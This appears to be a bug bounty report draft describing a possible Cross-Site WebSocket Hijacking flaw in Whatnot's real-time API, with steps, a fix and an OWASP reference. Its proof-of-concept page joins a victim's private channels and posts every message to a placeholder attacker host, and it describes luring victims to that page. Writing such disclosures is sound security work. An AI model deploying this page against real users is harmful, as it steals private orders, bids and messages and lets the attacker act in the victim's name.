# HackerOne Submission — Cross-Site WebSocket Hijacking (CSWSH)

**Program:** Whatnot  
**Weakness:** Cross-Site WebSocket Hijacking  
**Severity:** High  
**Asset:** api.whatnot.com / whatnot.com  

---

## Summary

WebSocket connections are not protected by the Same-Origin Policy. If Whatnot's Phoenix Channels endpoint does not validate the `Origin` header, a malicious website can establish a WebSocket connection to Whatnot's real-time API using the victim's browser cookies (if auth uses cookies). This allows the attacker's site to subscribe to the victim's private data streams — receiving real-time bid data, chat messages, order notifications, and potentially triggering actions (placing bids, sending messages) on the victim's behalf.

---

## Steps to Reproduce

### Step 1 — Identify the WebSocket endpoint and auth mechanism

First determine if Whatnot uses cookie-based auth for WebSocket (makes CSWSH possible) vs. token-in-URL auth (partially mitigates CSWSH but may still be vulnerable to token leakage):

```bash
# Open Whatnot.com in a browser while logged in, open DevTools → Network → WS tab
# Look for a WebSocket connection. Note:
# 1. The URL (e.g., wss://api.whatnot.com/socket/websocket)
# 2. Whether the request includes cookies in the Upgrade header
# 3. Whether a token appears in the URL query string
```

---

### Step 2 — Build the CSWSH proof-of-concept page

Save this as `cswsh_poc.html` and host it on a server you control (e.g., `https://attacker.example.com/cswsh_poc.html`):

```html
<!DOCTYPE html>
<html>
<head><title>CSWSH PoC - Whatnot</title></head>
<body>
<h1>CSWSH Proof of Concept</h1>
<pre id="output"></pre>

<script>
const log = msg => {
  document.getElementById('output').textContent += msg + '\n';
  // Also exfiltrate to attacker server
  fetch('https://attacker.example.com/collect', {
    method: 'POST',
    body: msg
  });
};

// Establish WebSocket to Whatnot from victim's browser
// Victim's cookies are automatically included by the browser
const ws = new WebSocket('wss://api.whatnot.com/socket/websocket?vsn=2.0.0');

ws.onopen = () => {
  log('[+] WebSocket connected! Origin not validated.');
  
  // Send Phoenix join message
  ws.send(JSON.stringify(["1","1","phoenix","phx_join",{}]));
  
  // Try to join victim's personal notification channel
  ws.send(JSON.stringify(["2","2","user_notifications","phx_join",{}]));
  
  // Try to join live auction channel
  ws.send(JSON.stringify(["3","3","live_stream:PUBLIC_STREAM_ID","phx_join",{}]));
};

ws.onmessage = event => {
  log('[DATA] ' + event.data);
};

ws.onerror = err => {
  log('[ERR] ' + JSON.stringify(err));
};

ws.onclose = e => {
  log('[CLOSED] Code: ' + e.code + ' Reason: ' + e.reason);
};
</script>
</body>
</html>
```

---

### Step 3 — Trick victim into visiting the page

Send the victim a link to `https://attacker.example.com/cswsh_poc.html`. As long as the victim is logged into Whatnot in the same browser, the page will establish a WebSocket to Whatnot using the victim's session.

---

### Step 4 — Observe data exfiltration

If vulnerable, your attacker server at `/collect` will receive:
- Victim's personal notification events (new orders, messages, bid wins)
- Live auction data (competing bids, auction results)
- Potentially private chat messages

---

### Step 5 — Test Origin header validation directly

```bash
# Test with a fake/attacker origin - does the server reject it?
curl -sv \
  -H "Origin: https://evil.attacker.com" \
  -H "Upgrade: websocket" \
  -H "Connection: Upgrade" \
  -H "Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==" \
  -H "Sec-WebSocket-Version: 13" \
  "https://api.whatnot.com/socket/websocket?vsn=2.0.0" 2>&1 | grep -E "^(< |HTTP)"

# Safe response: 403 Forbidden with "Origin not allowed"
# Vulnerable response: 101 Switching Protocols
```

---

## Expected Result

Server validates `Origin` header and rejects connections from unauthorized origins:
```
HTTP/1.1 403 Forbidden
X-Reason: Origin not allowed
```

## Actual Result (if vulnerable)

Connection accepted from arbitrary origins (`https://evil.attacker.com`), returning `101 Switching Protocols`.

---

## Impact

- Real-time exfiltration of victim's private data (orders, bids, messages) without any user interaction beyond visiting a link
- Attacker can place bids, send chat messages, or trigger other WebSocket actions on victim's behalf
- Scales to any number of victims — one malicious page can attack all visitors simultaneously
- Difficult for victim to detect — no visible UI change

---

## Recommended Fix

In Phoenix `UserSocket`:
```elixir
def connect(%{"token" => token}, socket, connect_info) do
  # Validate Origin header
  origin = get_in(connect_info, [:peer_data, :origin]) ||
           get_req_header(connect_info, "origin") |> List.first()
  
  unless origin in ["https://www.whatnot.com", "https://whatnot.com"] do
    :error
  else
    case verify_token(token) do
      {:ok, user_id} -> {:ok, assign(socket, :user_id, user_id)}
      _ -> :error
    end
  end
end
```

- Enforce `Origin` header validation in `UserSocket.connect/3`
- Use token-in-message authentication (not cookies) for WebSocket to prevent cross-site credential reuse
- Add CSRF tokens to WebSocket connection initiation
- Reference: [OWASP WebSocket Security](https://cheatsheetseries.owasp.org/cheatsheets/WebSocket_Security_Cheat_Sheet.html)
